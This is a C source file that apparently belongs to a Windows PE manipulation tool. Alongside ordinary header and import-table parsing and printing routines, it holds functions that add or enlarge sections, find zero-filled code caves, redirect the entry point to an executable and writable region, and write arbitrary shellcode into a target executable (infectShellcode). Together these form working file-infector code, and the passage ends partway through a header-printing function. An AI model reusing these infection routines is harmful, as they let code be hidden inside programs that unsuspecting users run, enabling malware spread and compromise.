#ifndef PEFILE
#define PEFILE
#include <winnt.h>
#include <stdio.h>
#include <windows.h>
#include <string.h>
#include "PEFile.h"
#include "utils.h"

int readPE32Header(
    FILE *FStream,
    PIMAGE_DOS_HEADER DOSHeader, 
    PIMAGE_NT_HEADERS32 NTHeaders,
    IMAGE_SECTION_HEADER SectionHeaders[]
){  
    rewind(FStream);
    if (fread(DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FStream) <= 0){
        printf("Error when read PE Header\n");
        return 1;
    }

    if (fseek(FStream, DOSHeader->e_lfanew, SEEK_SET) != 0){
        printf("Error when read PE Header\n");
        return 1;
    }

    if (fread(NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FStream) <= 0){
        printf("Error when read PE Header\n");
        return 1;
    }
    
    if (SectionHeaders)
        if (fread(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders->FileHeader.NumberOfSections, FStream) <= 0){
            printf("Error when read PE Header\n");
            return 1;
        }
      
    return 0;
}

int readPESection(FILE *FStream, IMAGE_SECTION_HEADER SectionHeader, UCHAR Section[]){
    unsigned int RawSize = SectionHeader.SizeOfRawData;
    unsigned int Offset = SectionHeader.PointerToRawData;
    fseek(FStream, Offset, SEEK_SET);
    if (fread(Section, 1, RawSize, FStream) != RawSize){
        printf("Error when read PE Section\n");
        return 1;
    }
    return 0;
}

int readPEImportTable(
    FILE *FStream, 
    IMAGE_SECTION_HEADER SectionHeaders[], 
    DWORD NumberOfSections,
    IMAGE_DATA_DIRECTORY datadirectory, 
    IMAGE_IMPORT_DESCRIPTOR pImportedDLLs[],
    PINT IndexOfSections
){
    DWORD RawSize = datadirectory.Size;
    DWORD VirtualAddress = datadirectory.VirtualAddress;

    if (RawSize == 0){
        printf("Error when read Import table\n");
        return 1;
    }

    for (INT i = 0; i <  NumberOfSections; i++){
        if (VirtualAddress >= SectionHeaders->VirtualAddress && 
        VirtualAddress < SectionHeaders->VirtualAddress + SectionHeaders->Misc.VirtualSize){
            *IndexOfSections = i;
            break;
        }
        SectionHeaders++;
    }

    DWORD Offset = rva2Offset(VirtualAddress, *SectionHeaders);
    fseek(FStream, Offset, SEEK_SET);
    UINT i = 0;
    IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
    memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    while(1){
        fread(pImportedDLLs + i, sizeof(IMAGE_IMPORT_DESCRIPTOR), 1, FStream);
        if (memcmp(pImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
            break;
        i++;
    }

    return 0;
}


DWORD rva2Offset(DWORD RVA, IMAGE_SECTION_HEADER SectionHeader){
    return (RVA - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData);
}

int extractLookupTable(
    FILE *FStream,
    IMAGE_SECTION_HEADER SectionHeader, 
    IMAGE_IMPORT_DESCRIPTOR ImportedDLL, 
    LOOKUP_ELEMENT LookUpTable[]
){   
    DWORD OffsetLookUpTable;
    if (ImportedDLL.OriginalFirstThunk != 0)
        OffsetLookUpTable = rva2Offset(ImportedDLL.OriginalFirstThunk, SectionHeader);
    else
        OffsetLookUpTable = rva2Offset(ImportedDLL.FirstThunk, SectionHeader);
    fseek(FStream, OffsetLookUpTable, SEEK_SET);
    
    int i = 0;
    IMAGE_THUNK_DATA32 thunk[MAX_IMPORTED_FUNC];
    while (1) {
        fread(thunk + i, sizeof(IMAGE_THUNK_DATA32), 1, FStream);
        if (thunk[i].u1.Function == 0)
            break;
        i++;
    }

    i = 0;
    IMAGE_IMPORT_BY_NAME funcDescriptor;
    UCHAR * Buffer = (UCHAR *) malloc(0xff);
    while (1) {
        LookUpTable[i].Ordinal = thunk[i].u1.Ordinal;
        if (thunk[i].u1.Function == 0)
            break;

        if ((LookUpTable[i].Ordinal & 0x80000000) == 0){
            DWORD nameOffset = rva2Offset(thunk[i].u1.AddressOfData, SectionHeader) + 2;
            fseek(FStream, nameOffset, SEEK_SET);
            fread(Buffer, 1, 0xff, FStream);
            strcpy(LookUpTable[i].Name, Buffer);
        }
        else {
            strcpy(LookUpTable[i].Name, "");
        }
        LookUpTable[i].Address = ImportedDLL.FirstThunk + i * sizeof(DWORD);
        i++;
    }
    free(Buffer);
    return 0;
}

BOOL checkBaseRelocation(
    IMAGE_OPTIONAL_HEADER32 OptionalHeader, 
    IMAGE_SECTION_HEADER SectionHeaders[],
    PIMAGE_SECTION_HEADER WhereSection
){
    if (OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
        return 0; // FALSE
    
    IMAGE_DATA_DIRECTORY BaseRelocTable = OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    while (SectionHeaders->SizeOfRawData != 0){
        if (BaseRelocTable.VirtualAddress >= SectionHeaders->VirtualAddress 
            && BaseRelocTable.VirtualAddress < SectionHeaders->VirtualAddress + SectionHeaders->Misc.VirtualSize)
            break;
        SectionHeaders++;
    }

    if (SectionHeaders->SizeOfRawData == 0)
        return 0; // FALSE

    if (WhereSection)
        *WhereSection = *SectionHeaders;

    return 1; // TRUE
}

DWORD adjustBaseRelocation(
    FILE *FStream, 
    FILE *NewFStream,
    IMAGE_SECTION_HEADER WhereSection
){  
    // Copy 0->PointerToRawData
    copyToFile(NewFStream, FStream, 0, WhereSection.PointerToRawData, 0xff);

    // Write Section .reloc with all 0s to new file
    UCHAR *Section = (UCHAR *) malloc(WhereSection.SizeOfRawData);
    memset(Section, 0, WhereSection.SizeOfRawData);
    fwrite(Section, 1, WhereSection.SizeOfRawData, NewFStream);
    free(Section);
    
    // Ignore corresponding part in input file
    DWORD Offset = WhereSection.PointerToRawData + WhereSection.SizeOfRawData;
    fseek(FStream, Offset, SEEK_SET);

    // Copy remain part to new file
    while (1){
        long ReadBytes = copyToFile(NewFStream, FStream, COPY_CURRENT_CURSOR, 0xffffffff, 0xffff);
        if (ReadBytes == 0)
            break;
    }

    return 0;
}

DWORD findFuncAddressByOrdinal(FILE *FStream, UCHAR *DLLName, DWORD Ordinal){
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeader;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    readPE32Header(FStream, &DOSHeader, &NTHeader, SectionHeaders);

    IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
    int IndexOfSectionHeader;
    readPEImportTable(
        FStream, 
        SectionHeaders, 
        NTHeader.FileHeader.NumberOfSections, 
        NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        ImportedDLLs,
        &IndexOfSectionHeader
    );

    const int MAX_BUFFER = 0xff;
    UCHAR * Buffer = (UCHAR *) malloc(MAX_BUFFER);

    int i = 0;
    LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
    IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];
    
    IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
    memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));

    DWORD Address = 0;
    while (1){
        if (memcmp(ImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
            break;

        DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);
        fseek(FStream, NameOffset, SEEK_SET);
        fread(Buffer, 1, 0xff, FStream);
        if (stricmp(DLLName, Buffer) != 0){
            i++;
            continue;
        }
        
        int j = 0;
        extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
        while (1) {
            if (LookUpTable[j].Ordinal == 0)
                break;

            if (LookUpTable[j].Ordinal & 0x80000000 
                && LookUpTable[j].Ordinal & 0xFFFF == Ordinal){
                Address = LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase;
                break;
            }
            j++;
        }
        if (Address)
            break;
        i++;
    }
    free(Buffer);
    return Address;
}

DWORD findFuncAddressByName(FILE *FStream, UCHAR *DLLName, UCHAR *FuncName){
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeader;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    readPE32Header(FStream, &DOSHeader, &NTHeader, SectionHeaders);

    IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
    int IndexOfSectionHeader;
    readPEImportTable(
        FStream, 
        SectionHeaders, 
        NTHeader.FileHeader.NumberOfSections, 
        NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        ImportedDLLs,
        &IndexOfSectionHeader
        );
    const int MAX_BUFFER = 0xff;
    UCHAR * Buffer = (UCHAR *) malloc(MAX_BUFFER);

    int i = 0;
    LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
    IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];
    
    IMAGE_IMPORT_DESCRIPTOR zeroImportedDLL;
    memset(&zeroImportedDLL, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR));
    DWORD Address = 0;
    while (1){
        if (memcmp(ImportedDLLs + i, &zeroImportedDLL, sizeof(IMAGE_IMPORT_DESCRIPTOR)) == 0)
            break;
        DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);
        fseek(FStream, NameOffset, SEEK_SET);
        fread(Buffer, 1, 0xff, FStream);
        if (stricmp(DLLName, Buffer) != 0){
            i++;
            continue;
        }
        
        int j = 0;
        extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
        while (1) {
            if (LookUpTable[j].Ordinal == 0)
                break;

            if (strcmp(LookUpTable[j].Name, FuncName) == 0){
                Address = LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase;
                break;
            }
            j++;
        }
        if (Address)
            break;
        i++;
    }
    free(Buffer);
    return Address;
}

DWORD findFuncAddressByRelativeName(FILE *FStream, UCHAR *DLLName, UCHAR *FuncName){
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeader;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    readPE32Header(FStream, &DOSHeader, &NTHeader, SectionHeaders);

    IMAGE_IMPORT_DESCRIPTOR ImportedDLLs[MAX_IMPORTED_DLL];
    int IndexOfSectionHeader;
    readPEImportTable(
        FStream, 
        SectionHeaders, 
        NTHeader.FileHeader.NumberOfSections, 
        NTHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT],
        ImportedDLLs,
        &IndexOfSectionHeader
        );

    const int MAX_BUFFER = 0xff;
    UCHAR * Buffer = (UCHAR *) malloc(MAX_BUFFER);

    int i = 0;
    LOOKUP_ELEMENT LookUpTable[MAX_IMPORTED_FUNC];
    IMAGE_SECTION_HEADER sh = SectionHeaders[IndexOfSectionHeader];
    while (1){
        if (ImportedDLLs[i].Characteristics == 0)
            break;

        DWORD NameOffset = rva2Offset(ImportedDLLs[i].Name, sh);
        fseek(FStream, NameOffset, SEEK_SET);
        fread(Buffer, 1, 0xff, FStream);
        if (strcmp(DLLName, Buffer) != 0){
            i++;
            continue;
        }
        
        int j = 0;
        extractLookupTable(FStream, sh, ImportedDLLs[i], LookUpTable);
        while (1) {
            if (LookUpTable[j].Ordinal == 0)
                break;

            if (strIsRelativeSubStr(LookUpTable[j].Name, FuncName) == 1)
                return LookUpTable[j].Address + NTHeader.OptionalHeader.ImageBase;
            j++;
        }

        i++;
    }
    free(Buffer);
    return 0;
}

DWORD align(DWORD Value, DWORD Alignment){
    return ((Value + Alignment - 1) / Alignment) * Alignment;
}

int padding(FILE *FStream, DWORD ActualSize){
    long CurrentCursor = ftell(FStream);
    long nZeros = ActualSize - CurrentCursor;
    if (nZeros < 0){
        printf("Warning: Cannot padding because current cursor is greater than actual size\n");
        return 1;
    }
    UCHAR *Padder = (UCHAR *) malloc(nZeros);
    memset(Padder, 0, nZeros);
    fwrite(Padder, 1, nZeros, FStream);
    free(Padder);
    return 0;
}

int adjustPEHeaders(
    PIMAGE_NT_HEADERS32 NTHeaders, 
    IMAGE_SECTION_HEADER SectionHeaders[],
    BOOL AdjustEntryPoint
){
    NTHeaders->FileHeader.NumberOfSections = 0;
    NTHeaders->OptionalHeader.SizeOfImage = 0;
    NTHeaders->OptionalHeader.SizeOfCode = 0;
    NTHeaders->OptionalHeader.SizeOfInitializedData = 0;
    NTHeaders->OptionalHeader.SizeOfUninitializedData = 0;
    
    int i = 0;
    while (1){
        NTHeaders->FileHeader.NumberOfSections += 1;
        
        if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_CODE)
            NTHeaders->OptionalHeader.SizeOfCode += SectionHeaders[i].SizeOfRawData;
        
        if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
            NTHeaders->OptionalHeader.SizeOfInitializedData += SectionHeaders[i].SizeOfRawData;
        
        if (SectionHeaders[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
            NTHeaders->OptionalHeader.SizeOfUninitializedData += SectionHeaders[i].SizeOfRawData;
        
        if (SectionHeaders[i + 1].PointerToRawData == 0)
            break;
        i++;
    }

    NTHeaders->OptionalHeader.SizeOfImage =
        align(
            SectionHeaders[i].Misc.VirtualSize + SectionHeaders[i].VirtualAddress, 
            NTHeaders->OptionalHeader.SectionAlignment
        );

    if (AdjustEntryPoint)
        NTHeaders->OptionalHeader.AddressOfEntryPoint = SectionHeaders[i].VirtualAddress;

    return 0;
}

DWORD addEmptySection(
    FILE *FStream, 
    FILE *NewFStream, 
    UCHAR * SectionName, 
    DWORD SectionSize, 
    BOOL Verbosity){
    const int MAX_BUFFER_SIZE = 0xff;

    FILE *FinHanle = FStream;
    FILE *FouHanle = NewFStream;
    
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    memset(SectionHeaders, 0, sizeof(SectionHeaders));

    if (Verbosity)
        printf("[+] Read PE Headers\n");
    readPE32Header(FinHanle, &DOSHeader, &NTHeaders, SectionHeaders);

    if (Verbosity)
        printf("[+] Create new section header\n");        
    int nSections = NTHeaders.FileHeader.NumberOfSections;
    // Set section's name
    if (strlen(SectionName) > 8)
        return 1;
    strcpy(SectionHeaders[nSections].Name, SectionName);
    if (strlen(SectionName) < 8)
        SectionHeaders[nSections].Name[strlen(SectionName)] = '\0';
    
    /************************************************************************************************* 
     * Set section's virtual address                                                                 *
     * = lastsection's virtual address + lastsection's virtual size, rounded up to Section Alignment *
     *************************************************************************************************/
    SectionHeaders[nSections].VirtualAddress = 
        align(
            SectionHeaders[nSections - 1].VirtualAddress + SectionHeaders[nSections - 1].Misc.VirtualSize,
            NTHeaders.OptionalHeader.SectionAlignment 
        );
    
    /************************************************************************************************* 
     * Set section's virtual size                                                                    *
     * = section's size, rounded up to Section Alignment                                             *
     *************************************************************************************************/
    SectionHeaders[nSections].Misc.VirtualSize = 
        align(SectionSize, NTHeaders.OptionalHeader.SectionAlignment);

    /************************************************************************************************* 
     * Set section's raw address                                                                     *
     * = lastsection's raw address + lastsection's raw size, rounded up to File Alignment            *
     *************************************************************************************************/
    SectionHeaders[nSections].PointerToRawData = 
        align(
            SectionHeaders[nSections - 1].PointerToRawData + SectionHeaders[nSections - 1].SizeOfRawData,
            NTHeaders.OptionalHeader.FileAlignment 
        );
    /************************************************************************************************* 
     * Set section's raw size                                                                        *
     * = section's size, rounded up to File Alignment                                                *
     *************************************************************************************************/
    SectionHeaders[nSections].SizeOfRawData = 
        align(SectionSize, NTHeaders.OptionalHeader.FileAlignment);

    /************************************************************************************************* 
     * Set section's Charactersitics                                                                 *
     * = code & init_data & uninit_data                                                              *
     *************************************************************************************************/
    SectionHeaders[nSections].Characteristics = 0
        | IMAGE_SCN_MEM_EXECUTE
        | IMAGE_SCN_MEM_READ
        | IMAGE_SCN_MEM_WRITE
        | IMAGE_SCN_CNT_CODE 
        | IMAGE_SCN_CNT_INITIALIZED_DATA 
        | IMAGE_SCN_CNT_UNINITIALIZED_DATA;

    if (Verbosity)
        printf("[+] Adjust all headers\n");
    adjustPEHeaders(&NTHeaders, SectionHeaders, FALSE);

    if (Verbosity)
        printf("[+] Put PE Headers to new file\n");
    fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHanle);
    
    padding(FouHanle, DOSHeader.e_lfanew);
    fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FouHanle);
    fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHanle);

    DWORD FinCurrentCursor = DOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32);
    FinCurrentCursor += sizeof(IMAGE_SECTION_HEADER) * NTHeaders.FileHeader.NumberOfSections;

    DWORD RemainSize = NTHeaders.OptionalHeader.SizeOfHeaders - FinCurrentCursor;
    copyToFile(FouHanle, FinHanle, FinCurrentCursor, RemainSize, MAX_BUFFER_SIZE);
    
    // Put all sections to new file 
    // EXCEPT just added section
    for (int i = 0; i < NTHeaders.FileHeader.NumberOfSections - 1; i++){
        if (Verbosity)
            printf("[+] Put section %.8s to new file\n", SectionHeaders[i].Name);
        int Offset = SectionHeaders[i].PointerToRawData;
        padding(FouHanle, Offset);
        copyToFile(FouHanle, FinHanle, Offset, SectionHeaders[i].SizeOfRawData, MAX_BUFFER_SIZE);
    }

    // Put added section to new file
    // by padding new file with all zero bytes till final of section
    if (Verbosity)
        printf("[+] Put section %.8s to new file\n", SectionName);
    int OffsetAtFinalOfSection =
        align(
            SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].PointerToRawData
            + SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].SizeOfRawData,
            NTHeaders.OptionalHeader.FileAlignment
        );
    padding(FouHanle, OffsetAtFinalOfSection);

    // Put remain bytes in file to new file
    while (1){
        long ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, MAX_BUFFER_SIZE);
        if (ReadBytes == 0)
            break;
    }

    return SectionHeaders[NTHeaders.FileHeader.NumberOfSections - 1].PointerToRawData;
}

DWORD expandLastSection(
    FILE *FStream, 
    FILE *NewFStream, 
    DWORD ExpandSize, 
    BOOL Verbosity
) {
    const int MAX_BUFFER_SIZE = 0xff;

    FILE *FinHanle = FStream;
    FILE *FouHanle = NewFStream;
    
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    memset(SectionHeaders, 0, sizeof(SectionHeaders));

    if (Verbosity)
        printf("[+] Read PE Headers\n");
    readPE32Header(FinHanle, &DOSHeader, &NTHeaders, SectionHeaders);

    if (Verbosity)
        printf("[+] Expand last section header\n");        
    int IndexLastSection = NTHeaders.FileHeader.NumberOfSections - 1;
    
    /************************************************************************************************* 
     * Set section's virtual size                                                                    *
     * = section's virtual size + expand size, rounded up to Section Alignment                                             *
     *************************************************************************************************/
    SectionHeaders[IndexLastSection].Misc.VirtualSize = 
        align(
            SectionHeaders[IndexLastSection].Misc.VirtualSize + ExpandSize, 
            NTHeaders.OptionalHeader.SectionAlignment
        );

    /************************************************************************************************* 
     * Set section's raw size                                                                        *
     * = section's raw size + expand size, rounded up to File Alignment                                                *
     *************************************************************************************************/
    DWORD OldRawSize = SectionHeaders[IndexLastSection].SizeOfRawData;
    SectionHeaders[IndexLastSection].SizeOfRawData = 
        align(
            SectionHeaders[IndexLastSection].SizeOfRawData + ExpandSize, 
            NTHeaders.OptionalHeader.FileAlignment
        );

    if (Verbosity)
        printf("[+] Adjust all headers\n");

    if (Verbosity)
        printf("[+] Put PE Headers to new file\n");

    fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHanle);
    padding(FouHanle, DOSHeader.e_lfanew);
    fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS), 1, FouHanle);
    fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHanle);
    
    DWORD FinCurrentCursor = DOSHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32);
    FinCurrentCursor += sizeof(IMAGE_SECTION_HEADER) * NTHeaders.FileHeader.NumberOfSections;

    DWORD tmp_size = NTHeaders.OptionalHeader.SizeOfHeaders - FinCurrentCursor;
    copyToFile(FouHanle, FinHanle, FinCurrentCursor, tmp_size, MAX_BUFFER_SIZE);
    

    // Put all sections to new file 
    // EXCEPT just expanded section
    for (int i = 0; i < NTHeaders.FileHeader.NumberOfSections - 1; i++){
        if (Verbosity)
            printf("[+] Put section %.8s to new file\n", SectionHeaders[i].Name);
        int Offset = SectionHeaders[i].PointerToRawData;
        padding(FouHanle, Offset);
        copyToFile(FouHanle, FinHanle, Offset, SectionHeaders[i].SizeOfRawData, MAX_BUFFER_SIZE);
    }


    // Put expanded section to new file
    // after padding new file with all zero bytes till final of section
    if (Verbosity)
        printf("[+] Put section %.8s to new file\n", SectionHeaders[IndexLastSection].Name);
    copyToFile(FouHanle, FinHanle, SectionHeaders[IndexLastSection].PointerToRawData, OldRawSize, MAX_BUFFER_SIZE);
    int OffsetAtFinalOfSection =
        align(
            SectionHeaders[IndexLastSection].PointerToRawData
            + SectionHeaders[IndexLastSection].SizeOfRawData,
            NTHeaders.OptionalHeader.FileAlignment
        );
    padding(FouHanle, OffsetAtFinalOfSection);


    // Put remain bytes in file to new file
    while (1){
        long ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, MAX_BUFFER_SIZE);
        if (ReadBytes == 0)
            break;
    }

    return SectionHeaders[IndexLastSection].PointerToRawData + OldRawSize;
}


DWORD findOffsetOfCodeCave(FILE *FStream, PIMAGE_SECTION_HEADER WhereSection, DWORD *Length) {
    
    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    
    readPE32Header(FStream, &DOSHeader, &NTHeaders, SectionHeaders);

    DWORD OffsetOfCave = 0;
    *Length = 0;
    for (int i = 0; i < NTHeaders.FileHeader.NumberOfSections; i++){
        UCHAR *Section = (PUCHAR) malloc(SectionHeaders[i].SizeOfRawData);
        readPESection(FStream, SectionHeaders[i], Section);

        DWORD Offset = 0;
        while (Offset < SectionHeaders[i].SizeOfRawData) {
            if (Section[Offset] == '\0'){
                DWORD SaveOffset = Offset;
                DWORD CaveLength = 0;
                while (Offset < SectionHeaders[i].SizeOfRawData && Section[Offset] == '\0'){
                    CaveLength++;
                    Offset++;
                }
                if (CaveLength > *Length) {
                    *Length = CaveLength;
                    OffsetOfCave = SectionHeaders[i].PointerToRawData + SaveOffset;
                    if (WhereSection)
                        *WhereSection = SectionHeaders[i];
                }
            }
            else
                Offset++;
        }

        free(Section);
    }

    return align(OffsetOfCave + 1, 0x10);
}

DWORD adjustEntryPoint(FILE *FStream, FILE *NewFStream, DWORD Offset){
    FILE *FinHanle = FStream;
    FILE *FouHanle = NewFStream;

    IMAGE_DOS_HEADER DOSHeader;
    IMAGE_NT_HEADERS32 NTHeaders;
    IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
    memset(SectionHeaders, 0, sizeof(SectionHeaders));

    readPE32Header(FinHanle, &DOSHeader, &NTHeaders, SectionHeaders);
    DWORD OldEntryPoint = NTHeaders.OptionalHeader.AddressOfEntryPoint;

    PIMAGE_SECTION_HEADER sh = SectionHeaders;
    while(sh->SizeOfRawData != 0){
        if (Offset >= sh->PointerToRawData 
        && Offset < sh->PointerToRawData + sh->SizeOfRawData)
            break;
        sh++;
    }
    if (sh->SizeOfRawData == 0)
        return 0;
    
    DWORD NewEntryPoint = Offset - sh->PointerToRawData + sh->VirtualAddress;
    NTHeaders.OptionalHeader.AddressOfEntryPoint = NewEntryPoint;
    /* sh->Misc.VirtualSize = 
        min(
            align(sh->Misc.VirtualSize, NTHeaders.OptionalHeader.SectionAlignment),
            sh->SizeOfRawData
        ); */
    sh->Characteristics |=
          IMAGE_SCN_MEM_EXECUTE
        | IMAGE_SCN_MEM_READ
        | IMAGE_SCN_MEM_WRITE
        | IMAGE_SCN_CNT_CODE;
    adjustPEHeaders(&NTHeaders, SectionHeaders, 0);

    fwrite(&DOSHeader, sizeof(IMAGE_DOS_HEADER), 1, FouHanle);
    padding(FouHanle, DOSHeader.e_lfanew);
    fwrite(&NTHeaders, sizeof(IMAGE_NT_HEADERS32), 1, FouHanle);
    fwrite(SectionHeaders, sizeof(IMAGE_SECTION_HEADER), NTHeaders.FileHeader.NumberOfSections, FouHanle);

    while (1){
        int ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, 0xffff);
        if (ReadBytes == 0)
            break;
    }

    return OldEntryPoint;
}


int infectShellcode(FILE *FStream, FILE *NewFStream, UCHAR *ShellCode, DWORD Size, DWORD Offset){
    FILE *FinHanle = FStream;
    FILE *FouHanle = NewFStream;

    copyToFile(FouHanle, FinHanle, 0, Offset, 0xff);
    fwrite(ShellCode, 1, Size, FouHanle);
    fseek(FinHanle, Size, SEEK_CUR);
    while (1){
        long ReadBytes = copyToFile(FouHanle, FinHanle, COPY_CURRENT_CURSOR, 0xffffffff, 0xff);
        if (ReadBytes == 0)
            break;
    }

    return 0;
}

void printDOSHeader(IMAGE_DOS_HEADER DOSHeader){
    printf("========================DOS HEADER===============================\n");
    printf("Magic Number:                     '%c%c'\n", *(char *)(&DOSHeader.e_magic), *((char *)(&DOSHeader.e_magic) + 1));
    printf("Bytes on last page of file:        0x%X\n", DOSHeader.e_cblp);
    printf("Pages in file:                     0x%X\n", DOSHeader.e_cp);
    printf("Relocations:                       0x%X\n", DOSHeader.e_crlc);
    printf("Size of header in paragraphs:      0x%X\n", DOSHeader.e_cparhdr);
    printf("Minimum extra paragraphs needed:   0x%X\n", DOSHeader.e_minalloc);
    printf("Maximum extra paragraphs needed:   0x%X\n", DOSHeader.e_maxalloc);
    printf("Initial (relative) SS value:       0x%X\n", DOSHeader.e_ss);
    printf("Initial SP value:                  0x%X\n", DOSHeader.e_sp);
    printf("Checksum:                          0x%X\n", DOSHeader.e_csum);
    printf("Initial IP value:                  0x%X\n", DOSHeader.e_ip);
    printf("Initial (relative) CS value:       0x%X\n", DOSHeader.e_cs);
    printf("File address of relocation table:  0x%X\n", DOSHeader.e_lfarlc);
    printf("Overlay number:                    0x%X\n", DOSHeader.e_ovno);
    printf("Reserved words (4 bytes):          0x%X%X%X%X\n", DOSHeader.e_res[0], DOSHeader.e_res[1], DOSHeader.e_res[2], DOSHeader.e_res[3]);
    printf("OEM identifier (for e_oeminfo):    0x%X\n", DOSHeader.e_oemid);
    printf("OEM information; e_oemid specific: 0x%X\n", DOSHeader.e_oeminfo);
    printf("Reserved words (10 bytes):         0x");
    for (int i = 0; i < 10; i++)
        printf("%X", DOSHeader.e_res2[i]);
    printf("\n");
    printf("File address of new exe header:    0x%lX\n", DOSHeader.e_lfanew);
}

void printFileHeader(IMAGE_FILE_HEADER FileHeader){
    printf("========================FILE HEADER===============================\n");
    printf("Machine:              0x%X\n", FileHeader.Machine);
    printf("NumberOfSections:     %u\n", FileHeader.NumberOfSections);
    printf("TimeDateStamp:        %ld\n", FileHeader.TimeDateStamp);
    printf("PointerToSymbolTable: 0x%lX\n", FileHeader.PointerToSymbolTable);
    printf("NumberOfSymbols:      0x%lX\n", FileHeader.NumberOfSymbols);
    printf("SizeOfOptionalHeader: 0x%X\n", FileHeader.SizeOfOptionalHeader);
    printf("Characteristics:      0x%X\n", FileHeader.Characteristics);
}

void printOptionalHeader(IMAGE_OPTIONAL_HEADER32 OptionalHeader){
    printf("========================OPTIONAL HEADER===============================\n");
    printf("---------Standard Fields----------\n");
    printf("Magic:                   0x%X\n" , OptionalHeader.Magic);
    printf("MajorLinkerVersion:      0x%X\n" , OptionalHeader.MajorLinkerVersion);
    printf("MinorLinkerVersion:      0x%X\n" , OptionalHeader.MinorLinkerVersion);
    printf("SizeOfCode:              0x%lX\n", OptionalHeader.SizeOfCode);
    printf("SizeOfInitializedData:   0x%lX\n", OptionalHeader.SizeOfInitializedData);
    printf("SizeOfUninitializedData: 0x%lX\n", OptionalHeader.SizeOfUninitializedData);
    printf("AddressOfEntryPoint:     0x%lX\n", OptionalHeader.AddressOfEntryPoint);
    printf("BaseOfCode:              0x%lX\n", OptionalHeader.BaseOfCode);
    printf("BaseOfData:              0x%lX\n", OptionalHeader.BaseOfData);
    printf("---------NT additional fields----------\n");
    printf("ImageBase:                   0x%lX\n", OptionalHeader.ImageBase);
    printf("SectionAlignment:            0x%lX\n", OptionalHeader.SectionAlignment);
    printf("FileAlignment:               0x%lX\n", OptionalHeader.FileAlignment);
    printf("MajorOperatingSystemVersion: 0x%X\n" , OptionalHeader.MajorOperatingSystemVersion);
    printf("MinorOperatingSystemVersion: 0x%X\n" , OptionalHeader.MinorOperatingSystemVersion);
    printf("MajorImageVersion:           0x%X\n" , OptionalHeader.MajorImageVersion);
    printf("MinorImageVersion:           0x%X\n" , OptionalHeader.MinorImageVersion);
    printf("MajorSubsystemVersion:       0x%X\n" , OptionalHeader.MajorSubsystemVersion);
    printf("MinorSubsystemVersion:       0x%X\n" , OptionalHeader.MinorSubsystemVersion);
    printf("Win32VersionValue:           0x%lX\n", OptionalHeader.Win32VersionValue);
    printf("SizeOfImage:                 0x%lX\n", OptionalHeader.SizeOfImage);
